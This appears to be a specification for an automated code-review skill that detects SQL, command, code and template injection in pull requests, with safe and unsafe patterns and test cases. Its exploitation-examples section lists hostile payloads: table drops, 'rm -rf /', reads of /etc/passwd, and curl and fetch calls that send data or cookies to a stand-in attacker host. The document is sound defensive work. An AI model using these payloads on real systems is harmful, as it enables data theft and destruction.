# injection-vulnerabilities Specification

## Intent

This is a Superwarden child skill synthesized from the **security** parent skill for the **injection-vulnerabilities** task.

It detects SQL injection (CWE-89), command injection (CWE-78), code injection (CWE-94), and template injection (CWE-1336) vulnerabilities in changed code where user-controlled inputs flow into SQL queries, shell commands, eval constructs, template engines, or dynamic code execution without proper sanitization or parameterization.

## Scope

### In Scope

- SQL injection via string concatenation, template literals, or format strings building SQL queries from untrusted input without parameterized queries or prepared statements
- Command injection via `child_process.exec`, `child_process.spawn` with `shell: true`, or shell command string construction from untrusted input
- Subprocess argument injection enabling flag injection (`--eval`, `--file`, `--exec`) or path traversal
- Code injection via `eval()`, `new Function()`, `vm.runInContext()`, `vm.runInNewContext()`, or dynamic `import()` with untrusted paths
- Template injection via unescaped template variables (EJS `<%- %>`, Handlebars `{{{ }}}`) receiving untrusted input without auto-escaping
- Client-side injection (XSS) via `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML` with untrusted input
- Data-flow tracing from entry points (CLI args, env vars, HTTP params, file contents, webhooks, LLM outputs) to execution sinks
- Framework-specific injection defense patterns (ORM parameterization, template auto-escaping, argument validation)

### Out of Scope (Covered by Sibling Tasks)

- **Authentication and authorization bypass** (covered by access-control-vulnerabilities). Only report injection when it enables authentication bypass (e.g., SQL injection `' OR '1'='1`).
- **Cryptographic implementation flaws** (covered by cryptographic-vulnerabilities). Only report injection, not crypto algorithm choices.
- **Dependency vulnerabilities** (covered by dependency-vulnerabilities). Only report injection introduced by application code, not dependency CVEs.
- **Secrets and credentials exposure** (covered by secrets-exposure). Only report injection, not secret storage.
- **Resource exhaustion or denial-of-service** (covered by resource-handling-vulnerabilities). Only report injection, not unbounded loops or memory leaks.
- **Style, formatting, or code quality** unrelated to injection risk.

## Users And Trigger Context

- **Primary users**: Security reviewers, Warden maintainers, CI/CD pipeline operators
- **Common trigger**: Code changes affecting database queries, subprocess invocation, code evaluation, or template rendering
- **Execution context**: Changed files in PR, commit, or local working tree

## Runtime Contract

- **Required tools**: Read, Grep, Glob for repo-local investigation; WebSearch, WebFetch for public documentation when framework/runtime behavior affects findings
- **Prohibited actions**: Sending repository code, secrets, private file paths, or proprietary details to web tools
- **Output schema**: Standard Warden findings array with changed-line anchoring, severity/confidence calibration, concrete evidence, and remediation patterns
- **Empty findings behavior**: Return empty array when evidence is insufficient to confirm vulnerability. Do not report speculative findings.
- **Missing context handling**: State missing context explicitly (input trustworthiness, framework defenses, deployment environment) and describe what evidence would confirm or rule out vulnerability

## Source And Evidence Model

### Repository Source Evidence

**Required for all findings**:

- Specific changed line numbers where user input flows into unsafe sink without sanitization or parameterization
- Complete data-flow trace from untrusted input source to vulnerable sink
- Reference to existing patterns showing deviation from safe patterns:
  - `src/utils/exec.ts`: `execFileNonInteractive` (safe), `execNonInteractive` (unsafe for user input), `execGitNonInteractive` (safe git wrapper)
  - `src/cli/git.ts`: All git commands use argument arrays (safe pattern)
  - `evals/fixtures/sql-injection/api.ts`: Vulnerable pattern (string interpolation `name = '${params.name}'`)
  - `package.json`: No database ORM dependencies (Prisma, Sequelize, Knex, TypeORM, Drizzle, Mongoose), no template engines (Handlebars, EJS, Pug)
  - React usage: `dangerouslySetInnerHTML` exists in Ink UI code (XSS risk if user input rendered)

### Public Documentation Evidence

**Required when framework/runtime behavior affects exploitability**:

- OWASP guidance:
  - [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
  - [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
  - [Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
  - [SSTI Testing Guide](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- CWE definitions:
  - [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
  - [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
  - [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- Node.js security:
  - [CVE-2024-27980: Windows batch file injection](https://nodejs.org/en/blog/vulnerability/april-2024-security-releases-2)
  - [CVE-2024-36138: Incomplete fix for CVE-2024-27980](https://nodejs.org/en/blog/vulnerability/july-2024-security-releases)
  - [Node.js SQL Injection Prevention](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/)
  - [Node.js Command Injection Prevention](https://www.nodejs-security.com/blog/secure-javascript-coding-practices-against-command-injection-vulnerabilities)
  - [Parameterized Queries in Node.js](https://medium.com/@ajay.monga73/parameterized-queries-javascript-guide-how-to-prevent-sql-injection-with-parameterized-queries-18c5cbbfffe2)
- Template engine security:
  - [Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
  - [Node.js Template Engines Security](https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough)
  - [JavaScript SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md)
- Code evaluation risks:
  - [eval Security Risks](https://www.nodejs-security.com/learn/nodejs-runtime-security/prevent-dynamic-eval)
  - [vm Module Limitations](https://snyk.io/blog/security-concerns-javascript-sandbox-node-js-vm-module/)

### Exploitability Prerequisites

**Document for all findings**:

- Attacker control over the input source (CLI argument, environment variable, HTTP request parameter, file content, webhook payload, LLM output)
- Absence of input validation (allowlist, type checking, regex, sanitization)
- Unsafe API usage (string concatenation in SQL, shell execution, eval, unescaped template variables)
- Missing framework protections (ORM parameterization, template auto-escaping, argument validation)

### Concrete Exploitation Examples

**Provide for all findings**:

- **SQL injection**: `'; DROP TABLE users; --` for data destruction, `' OR '1'='1` for authentication bypass, `' UNION SELECT password FROM users --` for data exfiltration
- **Command injection**: `; cat /etc/passwd` for file read, `| curl attacker.com` for data exfiltration, `&& rm -rf /` for data destruction
- **Argument injection**: `--eval 'malicious code'` for code execution, `--file /etc/passwd` for file read
- **Code injection**: JavaScript payload exfiltrating data (`fetch('http://attacker.com', {method: 'POST', body: document.cookie})`) or executing commands (`require('child_process').exec('whoami')`)
- **Template injection (SSTI)**: Server-side code execution payload for Node.js template engines
- **Template injection (XSS)**: Client-side script injection (`<script>alert(document.cookie)</script>`)

## Reference Architecture

### Safe Patterns

1. **SQL Injection Prevention**:
   - **Parameterized queries**: Use prepared statements with bound parameters
   - **ORM query builders**: Use Prisma, Sequelize, Knex, TypeORM, Drizzle with parameterization
   - **Input validation**: Type checking, allowlists, escaping before concatenation (defense-in-depth only, not primary defense)

2. **Command Injection Prevention**:
   - **`execFileNonInteractive(file, args)`**: Uses `spawnSync` without shell, passes arguments as array (safe when `file` and `args` controlled)
   - **`execGitNonInteractive(args)`**: Wraps `execFileNonInteractive('git', args)` (safe pattern for git commands)
   - **Argument validation**: Reject values starting with `-`, validate character sets, use `--` separator
   - **Allowlists**: Validate tool binaries against hardcoded paths

3. **Code Injection Prevention**:
   - **JSON.parse()**: Replace eval for JSON parsing
   - **Object property access**: Replace eval for dynamic property lookup
   - **Static imports**: Replace dynamic import with static imports where possible
   - **Path validation**: Validate dynamic import paths against allowlists

4. **Template Injection Prevention**:
   - **Auto-escaped syntax**: Handlebars `{{ }}`, EJS `<%= %>`, Pug `#{}`
   - **Template engine security options**: Enable automatic escaping, strict mode
   - **Input validation**: Sanitize user input before rendering (defense-in-depth)

### Unsafe Patterns

1. **SQL Injection**:
   - String concatenation: `db.query("SELECT * FROM users WHERE name = '" + userName + "'")`
   - Template literals: ``db.query(`SELECT * FROM users WHERE name = '${userName}'`)``
   - ORM raw queries: `db.raw("SELECT * FROM users WHERE name = '" + userName + "'")`

2. **Command Injection**:
   - `execNonInteractive(command)`: Uses `spawnSync(command, { shell: true })`, vulnerable if `command` contains user input
   - Shell execution: `exec("git clone " + repoUrl)`
   - Spawn with shell: `spawn("git clone " + repoUrl, { shell: true })`

3. **Code Injection**:
   - `eval(userInput)`
   - `new Function(userInput)()`
   - `vm.runInContext(userInput, context)`
   - `import(userControlledPath)`

4. **Template Injection**:
   - Unescaped syntax: EJS `<%- userInput %>`, Handlebars `{{{ userInput }}}`
   - `dangerouslySetInnerHTML={{ __html: userInput }}`
   - `element.innerHTML = userInput`

## Evaluation

### Positive Test Cases (Should Detect)

1. **SQL injection**: `db.query(\`SELECT * FROM users WHERE name = '${params.name}'\`)` where `params.name` from HTTP request
2. **Command injection**: ``execNonInteractive(`git clone ${repoUrl}`)`` where `repoUrl` from user input
3. **Argument injection**: `execFileNonInteractive('git', ['clone', untrustedUrl])` where `untrustedUrl` starts with `-`
4. **Code injection**: `eval(fileContent)` where `fileContent` from uploaded file
5. **Template injection (SSTI)**: `ejs.render(template, { userInput })` where `template` uses `<%- userInput %>`
6. **Template injection (XSS)**: `<div dangerouslySetInnerHTML={{ __html: userComment }} />` where `userComment` from HTTP request

### Negative Test Cases (Should Not Detect)

1. **Parameterized query**: `db.query('SELECT * FROM users WHERE name = ?', [userName])`
2. **ORM query builder**: `prisma.user.findMany({ where: { name: userName } })`
3. **Safe argument array**: `execFileNonInteractive('git', ['clone', 'https://github.com/owner/repo'])`
4. **Validated input**: `execFileNonInteractive('git', ['clone', validatedUrl])` where `validatedUrl` passes regex validation
5. **JSON.parse**: `JSON.parse(jsonString)` instead of `eval(jsonString)`
6. **Auto-escaped template**: `<%= userInput %>` in EJS or `{{ userInput }}` in Handlebars
7. **Hardcoded query**: `db.query('SELECT * FROM users WHERE role = "admin"')`

### False Positive Scenarios

- SQL queries built from trusted configuration files (not user-editable)
- Command execution from validated admin-only input with strict allowlists
- Template rendering with auto-escaping correctly applied
- Dynamic imports with path validation against allowlists
- Defense-in-depth controls (sandboxing, read-only database users) reducing impact to low severity

### False Negative Scenarios

- Indirect data flow through multiple intermediate functions or variables
- Complex string operations (concatenation chains, regex replacement, encoding/decoding) obscuring injection
- ORM raw query methods (`.raw()`, `.unsafe()`) with string concatenation
- Context-specific template injection (JavaScript context vs HTML context)
- Time-of-check-to-time-of-use (TOCTOU) races between validation and execution
- Windows-specific command injection (CVE-2024-27980) not detected without Windows context

## Known Limitations

- **Indirect data flows**: May miss injection when input flows through multiple intermediate functions, object properties, or closure variables. Requires deep inter-procedural analysis.
- **String operation complexity**: May miss injection via complex string manipulations (template literals, concatenation chains, regex replacement, base64 encoding/decoding).
- **Framework-specific parameterization**: May miss safe parameterization patterns unique to specific ORMs or database libraries not documented in public sources.
- **Template context sensitivity**: May not detect context-specific injection (JavaScript context, URL context, CSS context) when template engine auto-escaping doesn't cover all contexts.
- **Missing context assumptions**: Cannot conclusively determine risk when input trustworthiness, framework defenses, or deployment environment is unknown. Must state missing context explicitly.
- **Defense-in-depth controls**: Cannot assess impact reduction from input validation, sandboxing, or least privilege without deployment context.
- **Windows-specific vulnerabilities**: CVE-2024-27980 batch file injection may not be detected without Windows execution context.

## Maintenance Notes

- **Update OWASP/CWE references**: When new OWASP guidance or CWE definitions are published, update public documentation references.
- **Track framework patterns**: When new ORM libraries, template engines, or subprocess wrappers are adopted, document their parameterization and escaping patterns in SPEC.md and SKILL.md.
- **Monitor Node.js CVEs**: When new child_process CVEs are disclosed, add them to public documentation references and update exploitability prerequisites.
- **Calibrate severity**: When deployment environment or privilege model changes (e.g., add database access, enable shell execution, move to untrusted input sources), recalibrate severity and confidence guidance.
- **False positive feedback**: When reviewers report false positives, add them to false positive controls section with explanation (e.g., input from trusted config, validated admin input).
- **False negative feedback**: When injection vulnerabilities are missed, analyze root cause (indirect data flow, complex string ops, missing context) and update investigation protocol.
